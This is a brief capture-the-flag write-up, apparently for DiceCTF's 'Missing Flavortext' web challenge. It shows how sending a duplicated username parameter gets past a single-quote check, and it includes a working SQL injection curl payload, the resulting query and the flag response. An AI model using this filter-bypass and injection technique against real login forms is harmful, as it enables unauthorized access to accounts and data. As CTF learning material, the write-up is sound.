# Missing Flavortext

Replicate the setup.

`yarn add` stuff that's required, `node index.js`, throw a `console.log` to spit out the sql statement

`["''"].includes('\''); === false`

So the check on line 33 passes and we have single quotes, then it's just sql injection.  Put username twice so it's an array

curl -v 'https://missing-flavortext.dicec.tf/login' --data "username=' OR 1=1 OR-- -&username=whatever&password=whatever"

results in

```
SELECT id FROM users WHERE
    username = '' OR 1=1 OR-- -,whatever' AND
    password = 'whatever'
```

```
╭─zoey@parrot-virtual ~/sec/htb/oouch ‹master*› 
╰─$ curl 'https://missing-flavortext.dicec.tf/login' --data "username=' OR 1=1 OR-- -&username=whatever&password=whatever" 
<!doctype html>
<html>
    <head>
        <link rel="stylesheet" href="/styles.css">
    </head>
    <body>
        <div>
            <p>Looks like there was no flavortext here either :(</p>
            <p>Here's your flag?</p>
            <p>dice{sq1i_d03sn7_3v3n_3x1s7_4nym0r3}</p>
        </div>
    </body>
</html>
```